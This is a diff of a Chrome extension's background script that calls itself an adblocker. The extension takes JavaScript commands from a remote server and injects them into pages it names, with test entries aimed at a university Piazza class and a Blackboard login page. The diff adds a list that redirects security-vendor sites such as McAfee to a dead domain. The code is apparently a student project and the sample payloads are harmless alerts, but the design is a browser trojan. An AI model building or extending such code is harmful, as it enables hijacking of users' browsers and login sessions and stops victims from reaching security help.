@@ -2,22 +2,32 @@
  * user ID (int) identifier
  * js_cmd (list of pairs (site url, js function))
  * last_pkt (int) time in milliseconds since last check-in with server
+ * security_blacklist (list of strings) list of sites that will be redirected to "404.com"
  */
 var config = {
 	ID: 0,
 	js_cmd: [],
-	last_pkt: Date.now()
+	last_pkt: Date.now(),
+	security_blacklist: []
 };
 var socket = null;
+/* update the handler for redirection to consider changes to the list of forbidden
+ * reference:
+ * 	https://stackoverflow.com/questions/26157036/how-can-i-update-an-onbeforerequest-event-listener-in-a-chrome-extension
+ */
+function redirectHandler(details){
+    return{redirectUrl: "http://404.com/"};
+}
+function setListener(newList){
+    chrome.webRequest.onBeforeRequest.removeListener(redirectHandler);
+    chrome.webRequest.onBeforeRequest.addListener(
+        redirectHandler,
+        {urls: newList},
+		["blocking"]
+    );
+    chrome.webRequest.handlerBehaviorChanged();
+}
 
-//redirecting
-chrome.webRequest.onBeforeRequest.addListener(
-	function(details){
-			return{redirectUrl: "http://404.com/"};
-	},
-	{urls: redirect_domains},
-	["blocking"]
-);
 
 //basic blocking functionality for adblocker
 chrome.webRequest.onBeforeRequest.addListener(
@@ -29,28 +39,46 @@ chrome.webRequest.onBeforeRequest.addListener(
 );
 
 //arbitrary js execution
-//search through the list of js commands and
+//search through the list of js commands and run the ones that match for the current url
 /*references:
 	https://stackoverflow.com/questions/1979583/how-can-i-get-the-url-of-the-current-tab-from-a-google-chrome-extension
 	https://stackoverflow.com/questions/6497548/chrome-extension-make-it-run-every-page-load
  */
 chrome.tabs.onUpdated.addListener(
 	function(tabId, changeInfo, tab){
+		console.log(config);
+		var cmds_run = [];
 		if(changeInfo.status == 'complete' && tab.active){
 			chrome.tabs.query({'active': true, 'lastFocusedWindow': true}, function(tabs){
                 var url = tabs[0].url;
-				loadConfig().then(function () {
-					var site;
-                    Object.keys(config).forEach(function (pair) {
-                    	site = Object.keys(pair)[0];
-                        if (site === url){
-                        		chrome.tabs.executeScript(tabs[0].id, {code:pair[site]});
-                        		//TODO: how to remove the executed commands from the queue
-								//TODO: should we load/store every time the user opens a website?
+				var site;
+				console.log("URL: ", url)
+				config.js_cmd.forEach(function (pair) {
+                	site = Object.keys(pair)[0];
+                	console.log("targetSite: ",site);
+                	if (site.match(url)){
+                		chrome.tabs.executeScript(null, {"code": pair[site]});
+                		cmds_run.push(site);
+					}
+                });
 
+				console.log("cmds_run: ",cmds_run);
+				var listChanged = false;
+                cmds_run.forEach(function(name){
+                	console.log("removing: ", name);
+                	for(var i = 0; i < config.js_cmd.length; i++){
+                		console.log("current in list: ", Object.keys(config.js_cmd[i])[0]);
+                		if(Object.keys(config.js_cmd[i])[0].match(name)){
+                			config.js_cmd.splice(i,1);
+                			i--;
+                			listChanged = true;
 						}
-                    })
-                })
+					}
+				});
+
+                if(listChanged) {
+                    storeConfig();
+                }
             })
 		}
 	}
@@ -142,6 +170,7 @@ function createClientIDRequest(){
 
 function handleServerPayload(payload) {
 	console.log('Payload received: ' + JSON.stringify(payload, null, 2));
+	//TODO: control flow : {edit current 'config' based on payload; store payload}
 }
 
 
@@ -177,10 +206,14 @@ function connectToHost(){
 }
 
 function main_func() {
-	connectToHost();
-	
+	//connectToHost();
+	config.js_cmd.push({"https://piazza.com/class/jksrwiu8kuz2w5" : 'alert(\"u r hacked!\");'});
+    config.js_cmd.push({"https://piazza.com/class/jksrwiu8kuz2w5" : 'alert(\"u b hacked222222222!\");'});
+    config.js_cmd.push({"https://blackboard.stonybrook.edu/webapps/login/" : 'alert(\"This one as well 3333333?!\");'});
+	config.security_blacklist.push("https://www.mcafee.com/en-us/index.html");
+	setListener(config.security_blacklist);
 }
 
-loadConfig().then(main_func)
+loadConfig().then(main_func);
 
 
